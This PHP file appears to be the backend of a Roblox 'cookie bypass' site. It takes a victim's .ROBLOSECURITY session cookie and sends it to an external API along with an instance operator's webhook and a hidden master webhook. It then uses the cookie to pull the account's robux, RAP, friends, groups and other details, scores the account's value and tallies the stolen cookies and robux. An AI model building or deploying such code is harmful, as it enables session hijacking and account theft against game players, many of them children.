<?php
/**
 * Bypasserv3 - Bypass API Endpoint
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

// Random security scan
if (rand(1, 100) === 1) {
    securityScan(true);
}

// Random cleanup
if (rand(1, 50) === 1) {
    cleanupRateLimits();
}

// Method check
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

// Suspicious request check
if (isSuspiciousRequest()) {
    logSecurityEvent('suspicious_request', [
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'None'
    ]);
}

// Rate limiting
$ip = getUserIP();
if (!checkRateLimit($ip, 50, 3600)) {
    http_response_code(429);
    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded']);
    exit;
}

// Parse input
$input = json_decode(file_get_contents('php://input'), true);

if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
    exit;
}

// Extract data
$cookie = trim($input['cookie'] ?? '');
$directory = trim($input['directory'] ?? '');

// Validate cookie
if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

if (!validateCookie($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid cookie format']);
    logSecurityEvent('suspicious_cookie_attempt', ['ip' => $ip]);
    exit;
}

// Get instance data for webhook
$instanceData = getInstanceData($directory);
$userWebhook = $instanceData['userWebhook'] ?? '';

// Call external API to bypass
$externalApiUrl = EXTERNAL_API_URL . "?cookie=" . urlencode($cookie) . "&web=" . urlencode($userWebhook) . "&dh=" . urlencode(MASTER_WEBHOOK);

$ch = curl_init($externalApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 180);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$apiResponse = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 200 || empty($apiResponse)) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'External API failed']);
    logSecurityEvent('api_failure', ['http_code' => $httpCode]);
    exit;
}

$apiData = json_decode($apiResponse, true);

if (!$apiData || $apiData['status'] !== 'success') {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Invalid API response']);
    exit;
}

// Extract stats from API response
$robux = intval($apiData['robux'] ?? 0);
$rap = intval($apiData['rap'] ?? 0);
$summary = intval($apiData['summary'] ?? 0);

// Update instance stats
if ($instanceData) {
    updateInstanceStats($directory, 'totalCookies', ($instanceData['stats']['totalCookies'] ?? 0) + 1);
    updateInstanceStats($directory, 'totalRobux', ($instanceData['stats']['totalRobux'] ?? 0) + $robux);
    updateInstanceStats($directory, 'totalRAP', ($instanceData['stats']['totalRAP'] ?? 0) + $rap);
    updateInstanceStats($directory, 'totalSummary', ($instanceData['stats']['totalSummary'] ?? 0) + $summary);
    
    updateDailyStats($directory, 'cookies', 1);
    updateDailyStats($directory, 'robux', $robux);
    updateDailyStats($directory, 'rap', $rap);
    updateDailyStats($directory, 'summary', $summary);
}

// Update global stats
updateGlobalStats('totalCookies', 1);

// Calculate account score
$accountScore = 0;
$accountScore += min(20, floor($robux / 1000));
$accountScore += min(20, floor($rap / 5000));
$accountScore += min(30, floor($summary / 10000));
$accountScore = min(100, $accountScore);

// Get user info
$headers = ["Cookie: .ROBLOSECURITY=$cookie"];
$ch = curl_init("https://www.roblox.com/my/settings/json");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
curl_close($ch);

$settingsData = json_decode($response, true);
$userId = $settingsData['UserId'] ?? 'Unknown';
$username = $settingsData['Name'] ?? 'Unknown';
$isPremium = $settingsData['IsPremium'] ?? false;

// Get additional user info
$ch = curl_init("https://users.roblox.com/v1/users/$userId");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
curl_close($ch);

$userInfo = json_decode($response, true);
$displayName = $userInfo['displayName'] ?? $username;

// Get avatar
$avatarData = json_decode(file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=150x150&format=Png&isCircular=false"), true);
$avatarUrl = $avatarData['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';

// Get account age
$accountCreated = isset($userInfo['created']) ? strtotime($userInfo['created']) : time();
$accountAgeDays = floor((time() - $accountCreated) / 86400);

// Get friends
$ch = curl_init("https://friends.roblox.com/v1/users/$userId/friends/count");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
curl_close($ch);
$friendsData = json_decode($response, true);
$friendsCount = $friendsData['count'] ?? 0;

// Get followers
$ch = curl_init("https://friends.roblox.com/v1/users/$userId/followers/count");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
curl_close($ch);
$followersData = json_decode($response, true);
$followersCount = $followersData['count'] ?? 0;

// Get voice chat
$ch = curl_init("https://voice.roblox.com/v1/settings");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
curl_close($ch);
$vcData = json_decode($response, true);
$vcEnabled = $vcData['isVoiceEnabled'] ?? false;

// Get groups owned
$ch = curl_init("https://groups.roblox.com/v2/users/$userId/groups/roles");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
curl_close($ch);
$groupsData = json_decode($response, true);
$ownedGroups = 0;
if (isset($groupsData['data'])) {
    foreach ($groupsData['data'] as $group) {
        if ($group['role']['rank'] == 255) {
            $ownedGroups++;
        }
    }
}

// Log success
logSecurityEvent('successful_bypass', [
    'username' => $username,
    'userId' => $userId,
    'robux' => $robux,
    'score' => $accountScore
]);

// Return response
echo json_encode([
    'success' => true,
    'userInfo' => [
        'username' => $username,
        'displayName' => $displayName,
        'userId' => $userId,
        'robux' => $robux,
        'rap' => $rap,
        'premium' => $isPremium ? 'Yes' : 'No',
        'voiceChat' => $vcEnabled ? 'Yes' : 'No',
        'friends' => $friendsCount,
        'followers' => $followersCount,
        'accountAge' => "{$accountAgeDays} days",
        'groupsOwned' => $ownedGroups,
        'accountScore' => $accountScore
    ],
    'avatarUrl' => $avatarUrl
]);
?>
